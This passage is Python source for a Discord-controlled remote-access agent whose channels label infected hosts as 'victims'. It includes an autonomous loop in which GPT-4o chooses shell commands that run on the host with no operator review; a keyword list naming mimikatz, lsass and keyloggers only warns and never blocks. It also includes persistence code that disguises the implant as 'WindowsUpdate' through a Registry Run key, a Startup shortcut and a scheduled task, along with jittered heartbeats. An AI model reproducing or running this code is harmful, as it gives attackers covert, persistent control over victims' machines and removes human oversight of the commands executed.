            last_command = context["actions_taken"][-1]["command"] if context["actions_taken"] else ""
            prompt = f"""
You are an elite Senior Penetration Tester following the PTES methodology.
Current phase: {context['phase']}
Context: {context}

Previous command: {last_command}
Previous result/output: {last_result}

Respond ONLY in this format:

[PHASE]
<Current PTES Phase>

[ANALYSIS]
What you know so far
What is missing
Why this matters

[HYPOTHESIS]
What you believe might be possible next

[COMMAND]
<single command only>

[REASON]
Why THIS command is the best next step (specific, not generic)

Do NOT run random or redundant commands. Do NOT skip phases. Stop if objectives are met or no escalation path exists.
"""
            await logchan.send(f"[autonomous] Step {step}: Querying LLM for next action...")
            try:
                response = await self._create_chat_completion(
                    client,
                    model="gpt-4o",
                    messages=[{"role": "system", "content": prompt}]
                )
                llm_reply = response.choices[0].message.content.strip()
            except Exception as e:
                await logchan.send(f"[autonomous] LLM error: {e}")
                break

            # Discord message limit is 2000 characters
            import aiofiles
            async def send_long_message(channel, header, content, filename_prefix):
                message = f"{header}\n{content}"
                if len(message) > 2000:
                    filename = f"{filename_prefix}_step{step}.txt"
                    async with aiofiles.open(filename, "w", encoding="utf-8") as f:
                        await f.write(content)
                    await channel.send(f"{header} (sent as file, too long for Discord)", file=discord.File(filename))
                    os.remove(filename)
                else:
                    await channel.send(message)

            await send_long_message(logchan, f"[autonomous] Step {step} LLM reply:", llm_reply, "llm_reply")

            # Parse LLM reply for required sections
            def extract_section(text, section):
                lines = text.splitlines()
                start = None
                for i, line in enumerate(lines):
                    if line.strip().upper() == f"[{section}]":
                        start = i + 1
                        break
                if start is None:
                    return None
                # Find next section or end
                for j in range(start, len(lines)):
                    if lines[j].strip().startswith("[") and lines[j].strip().endswith("]"):
                        return "\n".join(lines[start:j]).strip()
                return "\n".join(lines[start:]).strip()

            phase = extract_section(llm_reply, "PHASE")
            analysis = extract_section(llm_reply, "ANALYSIS")
            hypothesis = extract_section(llm_reply, "HYPOTHESIS")
            command = extract_section(llm_reply, "COMMAND")
            reason = extract_section(llm_reply, "REASON")
            objectives_completed_section = extract_section(llm_reply, "OBJECTIVES_COMPLETED")

            missing = []
            if not phase: missing.append("PHASE")
            if not analysis: missing.append("ANALYSIS")
            if not hypothesis: missing.append("HYPOTHESIS")
            if not command: missing.append("COMMAND")
            if not reason: missing.append("REASON")

            if missing:
                await self.global_logs_channel.send(f"[autonomous] LLM reply missing sections: {', '.join(missing)}. Aborting.")
                self.mode = "passive"
                break

            # Update context with new information from LLM output
            if phase and phase != context["phase"]:
                context["phase"] = phase
                context.setdefault("phase_transitions", []).append({"step": step, "new_phase": phase})
            # Store last analysis, hypothesis, and reason for richer context
            context["last_analysis"] = analysis
            context["last_hypothesis"] = hypothesis
            context["last_reason"] = reason

            parsed_sections = f"PHASE: {phase}\nANALYSIS: {analysis[:100]}...\nHYPOTHESIS: {hypothesis[:100]}...\nCOMMAND: {command}\nREASON: {reason[:100]}..."
            await send_long_message(self.art_log_channel, "[autonomous] Parsed sections:", parsed_sections, "parsed_sections")

            # OPSEC: Minimize noisy commands and log all actions
            noisy_keywords = [
                "shutdown", "format", "delete", "remove", "ransom", "keylogger", "backdoor", "exfil", "lsass", "dump", "shadowcopy", "vssadmin", "mimikatz", "disable", "bypass"
            ]
            opsec_notes = []
            # Block or warn on obviously noisy/dangerous commands
            if command and any(kw in command.lower() for kw in noisy_keywords):
                opsec_notes.append(f"Command contains noisy/dangerous keyword. No operator review (autonomous mode).")
                opsec_warning = f"[opsec] Warning: Command '{command}' contains noisy/dangerous keyword. No operator review (autonomous mode)."
                await send_long_message(logchan, "", opsec_warning, "opsec_warning")
            audit_entry = {
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                "step": step,
                "phase": phase,
                "command": command,
                "analysis": analysis,
                "hypothesis": hypothesis,
                "reason": reason,
                "opsec_notes": opsec_notes if opsec_notes else None
            }
            try:
                result = await self._run_shell_command(command)
                audit_entry["result"] = result[:500]
            except Exception as e:
                result = f"[ERROR] {e}"
                audit_entry["error"] = str(e)
                # Error reporting to Discord
                await logchan.send(f"[audit] ERROR executing command: {command}\nError: {e}")
                # Store error in context
                context.setdefault("errors", []).append({
                    "step": step,
                    "command": command,
                    "error": str(e),
                    "timestamp": audit_entry["timestamp"]
                })
            # Add OPSEC notes to context for this step
            if opsec_notes:
                context.setdefault("opsec_events", []).append({
                    "step": step,
                    "command": command,
                    "notes": opsec_notes
                })
            # Write audit entry to local file
            try:
                with open("agent_audit.log", "a", encoding="utf-8") as f:
                    import json
                    f.write(json.dumps(audit_entry) + "\n")
            except Exception as logerr:
                await logchan.send(f"[audit] ERROR writing to audit log: {logerr}")

            # Update context and history
            context["actions_taken"].append({
                "step": step,
                "phase": phase,
                "command": command,
                "result": result[:200],
                "analysis": analysis,
                "hypothesis": hypothesis,
                "reason": reason
            })
            history.append(f"Step {step}:\nCOMMAND: {command}\nRESULT: {result[:1000]}{'...<truncated>' if len(result)>1000 else ''}")
            await logchan.send(f"[autonomous] Step {step} result:\n{result[:1900]}{'...<truncated>' if len(result)>1900 else ''}")


            # Only mark objectives as completed if explicitly listed in [OBJECTIVES_COMPLETED] section
            if objectives_completed_section:
                completed = [o.strip().lower() for o in objectives_completed_section.splitlines() if o.strip()]
                context["objectives_completed"] = completed

            # If all objectives are completed, generate and upload report before stopping
            if set(context.get("objectives_completed", [])) == set([o.lower() for o in context["objectives"]]):
                await logchan.send(f"[autonomous] All objectives completed. Requesting final report from LLM...")
                # Ask LLM to generate the final report as markdown
                report_prompt = f"""
You are an elite Senior Penetration Tester following the PTES methodology.
The assessment is now complete. Using the following context, generate a comprehensive PTES assessment report in Markdown format. The report should be suitable for delivery to a client and include all relevant findings, actions, and recommendations. Do not include any text outside the markdown report itself.

Context:
{context}
"""
                try:
                    response = await self._create_chat_completion(
                        client,
                        model="gpt-4o",
                        messages=[{"role": "system", "content": report_prompt}]
                    )
                    report_markdown = response.choices[0].message.content.strip()
                except Exception as e:
                    await self.art_log_channel.send(f"[autonomous] LLM error generating report: {e}")
                    self.mode = "passive"
                    break
                # Write LLM markdown report to Report.md
                report_filename = "Report.md"
                with open(report_filename, "w", encoding="utf-8") as f:
                    f.write(report_markdown)
                # Upload to #reports channel and delete after upload
                report_channel = discord.utils.get(self.get_all_channels(), name="reports")
                if report_channel:
                    await report_channel.send("PTES Assessment Report:", file=discord.File(report_filename))
                    await self.art_log_channel.send(f"[autonomous] Final report uploaded to #reports. Exiting autonomous mode.")
                else:
                    await self.art_log_channel.send(f"[autonomous] Could not find #reports channel. Report not uploaded.")
                try:
                    os.remove(report_filename)
                except Exception as e:
                    await self.art_log_channel.send(f"[autonomous] Failed to delete report file: {e}")
                self.mode = "passive"
                break

            # If LLM signals no escalation path or abort in analysis/hypothesis/reason
            stop_signals = ["no escalation path", "no further action", "cannot proceed", "abort", "objective complete"]
            combined = f"{analysis}\n{hypothesis}\n{reason}".lower()
            if any(sig in combined for sig in stop_signals):
                await logchan.send(f"[autonomous] LLM signaled stop condition: {', '.join([sig for sig in stop_signals if sig in combined])}. Exiting autonomous mode.")
                self.mode = "passive"
                break

            step += 1
            await asyncio.sleep(2)

    def setup_registry_run_key(self, exe_path):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True, "Registry Run key set."
        except Exception as e:
            return False, f"Registry Run key failed: {e}"

    def cleanup_registry_run_key(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            winreg.CloseKey(key)
            return True, "Registry Run key removed."
        except Exception as e:
            return False, f"Registry Run key cleanup failed: {e}"

    def setup_startup_shortcut(self, exe_path):
        try:
            import os
            startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
            import pythoncom
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.save()
            return True, "Startup shortcut created."
        except Exception as e:
            return False, f"Startup shortcut failed: {e}"

    def cleanup_startup_shortcut(self):
        try:
            import os
            startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
            return True, "Startup shortcut removed."
        except Exception as e:
            return False, f"Startup shortcut cleanup failed: {e}"

    def setup_schtask(self, exe_path):
        import subprocess
        try:
            task_name = "WindowsUpdate"
            cmd = ["schtasks", "/Create", "/SC", "ONLOGON", "/TN", task_name, "/TR", f'\"{exe_path}\"', "/F"]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode == 0:
                return True, "Scheduled task created."
            else:
                return False, f"Scheduled task failed: {result.stderr.decode('utf-8', errors='replace')}"
        except Exception as e:
            return False, f"Scheduled task failed: {e}"

    def cleanup_schtask(self):
        import subprocess
        try:
            task_name = "WindowsUpdate"
            cmd = ["schtasks", "/Delete", "/TN", task_name, "/F"]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode == 0:
                return True, "Scheduled task removed."
            else:
                return False, f"Scheduled task cleanup failed: {result.stderr.decode('utf-8', errors='replace')}"
        except Exception as e:
            return False, f"Scheduled task cleanup failed: {e}"

    async def on_member_join(self, member):
        if member.id == self.user.id:
            return
        guild = member.guild
        agent_role = discord.utils.get(guild.roles, name="Agent")
        if agent_role and agent_role not in member.roles:
            await member.add_roles(agent_role, reason="Auto-assign Agent role to new victim/agent")

    async def on_ready(self):
        guild = self.guilds[0]
        agent_role = discord.utils.get(guild.roles, name="Agent")
        if not agent_role:
            agent_role = await guild.create_role(name="Agent", colour=discord.Colour.dark_grey(), mentionable=True, reason="Ensure Agent role exists")
        if agent_role not in guild.me.roles:
            await guild.me.add_roles(agent_role, reason="Assign Agent role to self")

        async def get_or_create_category(name):
            cat = discord.utils.get(guild.categories, name=name)
            if not cat:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                cat = await guild.create_category(name, overwrites=overwrites)
            return cat

        operations_cat = await get_or_create_category("C2 OPERATIONS")
        logs_cat = await get_or_create_category("LOGS & AUDIT")
        victims_cat = await get_or_create_category("VICTIMS")
        control_cat = await get_or_create_category("CONTROL")
        self.category = victims_cat

        async def get_or_create_channel(cat, name):
            ch = discord.utils.get(cat.channels, name=name)
            if not ch:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                ch = await guild.create_text_channel(name, category=cat, overwrites=overwrites)
            return ch

        self.briefings_channel = await get_or_create_channel(operations_cat, "briefings")
        self.sitreps_channel = await get_or_create_channel(operations_cat, "sitreps")
        self.global_logs_channel = await get_or_create_channel(logs_cat, "global-logs")
        self.payload_channel = await get_or_create_channel(control_cat, "payloads")
        self.intel_channel = await get_or_create_channel(control_cat, "intel-feed")
        self.reports_channel = await get_or_create_channel(logs_cat, "reports")
        self.announcements_channel = self.sitreps_channel

        # Ensure art-log exists or fallback to global-log
        try:
            self.art_log_channel = await get_or_create_channel(logs_cat, "art-log")
        except Exception:
            self.art_log_channel = None

        channel_name = f"cmd-{self.hostname.lower().replace(' ','-')}-{self.unique_id[:6]}"
        for ch in victims_cat.channels:
            if ch.name == channel_name:
                self.channel = ch
                break
        else:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            owner = guild.owner
            if owner:
                overwrites[owner] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
            self.channel = await guild.create_text_channel(channel_name, category=victims_cat, overwrites=overwrites)

        current_user = get_current_user()
        await self.briefings_channel.send(f"🟢 **C2 Agent Online**\nHost: `{self.hostname}`\nUser: `{current_user}`\nID: `{self.unique_id}`")
        await self.channel.send(f"🟢 **C2 Agent Online**\nHost: `{self.hostname}`\nUser: `{current_user}`\nID: `{self.unique_id}`")

        if not self.heartbeat_task:
            self.heartbeat_task = asyncio.create_task(self.heartbeat_loop())

    async def heartbeat_loop(self):
        while True:
            jitter = random.randint(180, 330)
            await asyncio.sleep(jitter)
            self.last_heartbeat = time.time()
            await self.channel.edit(name=self.channel.name.replace("[OFFLINE]", ""))
            msg = f"💓 Heartbeat: `{self.hostname}` alive at {time.strftime('%Y-%m-%d %H:%M:%S')}"
            await self.sitreps_channel.send(msg)

    async def offline_monitor(self):
        while True:
            await asyncio.sleep(60)
            if time.time() - self.last_heartbeat > 300:
                if "[OFFLINE]" not in self.channel.name:
                    await self.channel.edit(name=self.channel.name + "[OFFLINE]")
                    await self.announcements_channel.send(f"🔴 [OFFLINE] {self.hostname} ({self.unique_id})")

def run_discord_thread():
    if not acquire_single_instance_guard():
        return
    configure_windows_event_loop_policy()
    intents = discord.Intents.default()
    intents.message_content = True
    client = DiscordC2(intents=intents)
    client.run(BOT_TOKEN)

if __name__ == "__main__":
    run_discord_thread()